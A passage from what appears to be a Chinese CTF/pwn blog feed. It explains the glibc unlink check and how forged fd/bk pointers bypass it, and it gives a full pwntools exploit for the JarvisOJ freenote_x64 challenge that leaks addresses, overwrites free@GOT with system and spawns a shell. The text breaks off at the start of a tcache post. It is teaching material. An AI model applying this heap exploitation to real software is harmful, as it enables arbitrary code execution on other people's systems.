    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>unlink是在smallbin被释放的时候的一种操作，是将当前物理内存相邻的free chunk进行合并,简单的讲就是我们在free一个smallchunk的时候，如果它前面或者后面的chunk有空闲的，即in_use位为0时，就将前面或后面的chunk连在一起合成一个chunk;<br>smallbin的数据结构：prev_size,size,fd,bk;<br>因为smallbin被释放后是用双链串在一起的，这就使目前unlink操作时，有一定的检查机制，主要检查我们的双链是否是合法的；<br>主要检查fd,bk等指针：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);</span><br></pre></td></tr></table></figure></p><p>在双向链表中，所以有两个地方记录chunk的大小，所以检查一下其大小是否一致：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);</span><br></pre></td></tr></table></figure><p>unlink操作的简要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD)</span></span><br><span class="line">&#123;</span><br><span class="line">    FD = P-&gt;fd;</span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span>(FD-&gt;bk != P || BK-&gt;fd !=p)</span><br><span class="line">    &#123;</span><br><span class="line">        malloc_printerr (check_action, <span class="string">"corrupted d..."</span>, P);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        FD-&gt;bk = BK;</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>实际上，我们还是有办法绕过unlink的检查，不过需要有一些条件：</p><ol><li>有一个指向heap内的指针；</li><li>存放这个指针的地址已知(一般这个地址(&amp;p)是全局变量)；</li><li>可以对这个指针进行多次写入；</li><li>然后我们想办法修改p的fd和p的bk分别为:</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位</span></span><br><span class="line">p-&gt;fd = &amp;p - <span class="number">0x18</span>; <span class="comment">//fd</span></span><br><span class="line">p-&gt;bk = &amp;p - <span class="number">0x10</span>; <span class="comment">//bk</span></span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">p-&gt;fd = &amp;p - <span class="number">12</span>; <span class="comment">//fd</span></span><br><span class="line">p-&gt;bk = &amp;p - <span class="number">8</span>; <span class="comment">//bk</span></span><br></pre></td></tr></table></figure><p>这样我们就可以绕过(FD-&gt;bk != P || BK-&gt;fd !=p)检测了，当unlink的操作完了之后，我们得到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位</span></span><br><span class="line">p = &amp;p - <span class="number">0x18</span>；</span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">p = &amp;p - <span class="number">12</span>;</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>我们以JarvisOJ中的freenote_x64来具体演示一下绕过unlink的操作并且熟悉一下smallbin的结构；<br>这道题在add函数和edit函数中，真实malloc的size最小都是0x80，也就是我们申请的是smallbin,所以操作的也是samllbin；<br>主要漏洞在delete note里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+Ch] [bp-4h]@2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( chunk_list-&gt;number &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No posts yet."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Post number: "</span>);</span><br><span class="line">    i = get_num();</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="number">0</span> &amp;&amp; i &lt; chunk_list-&gt;sum )        <span class="comment">// 未检查inuse位，double_free</span></span><br><span class="line">    &#123;</span><br><span class="line">      --chunk_list-&gt;number;</span><br><span class="line">      chunk_list-&gt;block[i].in_use = <span class="number">0L</span>L;</span><br><span class="line">      chunk_list-&gt;block[i].len = <span class="number">0L</span>L;</span><br><span class="line">      <span class="built_in">free</span>(chunk_list-&gt;block[i].ptr);           <span class="comment">// 指针未清空</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Done."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid number!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个有用的漏洞就是add和edit时，我们输入的字符串没有‘\x00’结尾符，我们输入多大的size就读多少size的字符，没有多余；</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>所以基本思路就是我们先申请4个chunk，然后free(0)和free(2)，防止合并；然后在申请2个chunk，只写入8字节，就可以leak出heap和libc的基地址;<br>在heap基地址偏移0x30的地方有我们需要的&amp;p:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603000</span><br><span class="line">0x603000:0x0000000000000000 0x0000000000001821</span><br><span class="line">0x603010:0x0000000000000100 0x0000000000000004</span><br><span class="line">0x603020:0x0000000000000001 0x0000000000000004</span><br><span class="line">0x603030:&amp;p0x0000000000604830 p 0x0000000000000001</span><br><span class="line">0x603040:0x0000000000000002 0x00000000006048c0</span><br><span class="line">0x603050:0x0000000000000001 0x0000000000000001</span><br><span class="line">0x603060:0x0000000000604950 0x0000000000000001</span><br><span class="line">0x603070:0x0000000000000004 0x00000000006049e0</span><br><span class="line">0x603080:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603090:0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure></p><p>有了&amp;p之后我们就可以构造chunk，然后unlink了；<br>unlink之后的&amp;p,此时p=&amp;p-0x18:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603000</span><br><span class="line">0x603000:0x0000000000000000 0x0000000000001821</span><br><span class="line">0x603010:0x0000000000000100 0x0000000000000004</span><br><span class="line">0x603020:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603030:0x0000000000603018 p 0x0000000000000001 //p=&amp;p-0x18</span><br><span class="line">0x603040:0x0000000000000008 0x00000000006048c0</span><br><span class="line">0x603050:0x0000000000000001 0x0000000000000001</span><br><span class="line">0x603060:0x0000000000604950 0x0000000000000001</span><br><span class="line">0x603070:0x0000000000000004 0x00000000006049e0</span><br><span class="line">0x603080:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603090:0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>然后现在我们就可以修改0x0603018地址开始的内容了，然后就可以修改指针达到任意地址写入了；</p><h3 id="具体思路"><a href="#具体思路" class="headerlink" title="具体思路"></a>具体思路</h3><p>伪造的如下三个堆块结构 ，注意chunk前后的size一定要相对应<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80xg 0x17b8820</span><br><span class="line">0x17b8820:0x00000000000000000x0000000000000191</span><br><span class="line">0x17b8830:0x00000000000000900x0000000000000081</span><br><span class="line">0x17b8840:0x00000000017b70180x00000000017b7020</span><br><span class="line">0x17b8850:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8860:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8870:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8880:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8890:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b88a0:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b88b0:0x00000000000000800x0000000000000090</span><br><span class="line">0x17b88c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88d0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8900:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8910:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8920:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8930:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8940:0x00000000000000900x0000000000000121</span><br><span class="line">0x17b8950:0x32323232323232320x00007f61721feb78</span><br><span class="line">0x17b8960:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8970:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8980:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8990:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89b0:0x63636363636363630x0000000000020651</span><br><span class="line">0x17b89c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89d0:0x00000000000001200x0000000000000090</span><br><span class="line">0x17b89e0:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b89f0:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a00:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a10:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a20:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a30:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a40:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a50:0x64646464646464640x6464646464646464</span><br></pre></td></tr></table></figure></p><p>free(1)之后，堆块的结构<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80xg 0x11dd820</span><br><span class="line">0x11dd820:0x00000000000000000x0000000000000191</span><br><span class="line">0x11dd830:0x00000000000000900x0000000000000111</span><br><span class="line">0x11dd840:0x00007fc6bdb86b780x00007fc6bdb86b78</span><br><span class="line">0x11dd850:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd860:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd870:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd880:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd890:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd8a0:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd8b0:0x00000000000000800x0000000000000090</span><br><span class="line">0x11dd8c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8d0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd900:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd910:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd920:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd930:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd940:0x00000000000001100x0000000000000120</span><br><span class="line">0x11dd950:0x32323232323232320x00007fc6bdb86b78</span><br><span class="line">0x11dd960:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd970:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd980:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd990:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9b0:0x63636363636363630x0000000000020651</span><br><span class="line">0x11dd9c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9d0:0x00000000000001200x0000000000000090</span><br><span class="line">0x11dd9e0:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dd9f0:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda00:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda10:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda20:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda30:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda40:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda50:0x64646464646464640x6464646464646464</span><br></pre></td></tr></table></figure></p><p>而目标地址已经被修改为 p=&amp;p-0x18<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40xg 0x11dc000</span><br><span class="line">0x11dc000:0x00000000000000000x0000000000001821</span><br><span class="line">0x11dc010:0x00000000000001000x0000000000000000</span><br><span class="line">0x11dc020:0x00000000000000010x0000000000000120</span><br><span class="line">0x11dc030:0x00000000011dc0180x0000000000000000  //p=&amp;p-0x18</span><br><span class="line">0x11dc040:0x00000000000000000x00000000011dd8c0</span><br><span class="line">0x11dc050:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc060:0x00000000011dd9500x0000000000000000</span><br><span class="line">0x11dc070:0x00000000000000000x00000000011dd9e0</span><br><span class="line">0x11dc080:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc090:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc100:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc110:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc120:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc130:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>接下来向 chunk0 里面写内容就相当于控制了chunk list，随便修改东西，这里把free_got覆盖为system</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./freenote_x64'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29050</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./freenote_x64'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">List</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Length of new note: '</span>)</span><br><span class="line">p.sendline(str(len(cont)))</span><br><span class="line">p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">p.sendline(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'Length of note: '</span>)</span><br><span class="line">p.sendline(str(len(cont)))</span><br><span class="line">p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">p.sendline(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">new(<span class="string">'a'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'b'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'c'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'d'</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="string">'11111111'</span>)</span><br><span class="line">new(<span class="string">'22222222'</span>)</span><br><span class="line">List()</span><br><span class="line">p.recvuntil(<span class="string">'11111111'</span>)</span><br><span class="line">s=p.recvuntil(<span class="string">'\x0a'</span>)</span><br><span class="line">chunk2=u64(s[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_addr=chunk2<span class="number">-0x1940</span></span><br><span class="line">point_chunk0=heap_addr+<span class="number">0x30</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">payload = p64(<span class="number">0x90</span>)+p64(<span class="number">0x81</span>)+p64(point_chunk0<span class="number">-0x18</span>)+p64(point_chunk0<span class="number">-0x10</span>) </span><br><span class="line">payload +=<span class="string">'a'</span>*<span class="number">0x60</span></span><br><span class="line">payload += p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">payload +=<span class="string">'c'</span>*<span class="number">0x80</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x121</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#free_got-&gt;system</span></span><br><span class="line">free_got_addr=e.got[<span class="string">'free'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(free_got_addr)</span><br><span class="line">payload2=p64(<span class="number">4</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(free_got_addr)</span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(chunk2)</span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(e.got[<span class="string">'atoi'</span>])</span><br><span class="line">payload2+=<span class="string">'\x00'</span>*(<span class="number">0x120</span><span class="number">-80</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: Invalid!\n'</span>)</span><br><span class="line"></span><br><span class="line">List()</span><br><span class="line">p.recvuntil(<span class="string">'2. '</span>)</span><br><span class="line">atoi_in_server=u64(p.recvuntil(<span class="string">'\x0a'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">system_in_server=libc.symbols[<span class="string">'system'</span>]+atoi_in_server-libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line"></span><br><span class="line">payload3=p64(system_in_server)</span><br><span class="line">edit(<span class="number">0</span>,payload3)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://blog.csdn.net/qq_40827990/java/article/details/88090810" target="_blank" rel="noopener">https://blog.csdn.net/qq_40827990/java/article/details/88090810</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;unlink是在smallbin被释放的时候的一种操作，是将当前物理内存相邻的free chunk进行合并,简单的讲就是我们在free一个s
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>tcache机制</title>
    <link href="https://nocbtm.github.io/2020/02/27/tcache%E6%9C%BA%E5%88%B6/"/>
    <id>https://nocbtm.github.io/2020/02/27/tcache机制/</id>
    <published>2020-02-27T03:36:21.000Z</published>
    <updated>2020-04-09T13:15:24.347Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>glibc 2.26</code> 开始引入了 <code>tcache</code> , 相关的 commit 可以看<br><a href="https://sourceware.org/git/p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc" target="_blank" rel="noopener">https://sourceware.org/git/p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc</a> 。<br>加入 <code>tcache</code> 对性能有比较大的提升，不过由于 <code>tcache</code> 的存在 ，一些利用方式的限制条件就少了许多。具体往下看。</p><p>相关文件位于 <a href="https://github.com/andigena/ptmalloc-fanzine/tree/master/05-tcache" target="_blank" rel="noopener">https://github.com/andigena/ptmalloc-fanzine/tree/master/05-tcache</a></p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>首先分析分析源码，看看 <code>tcache</code> 的工作原理</p><h3 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span 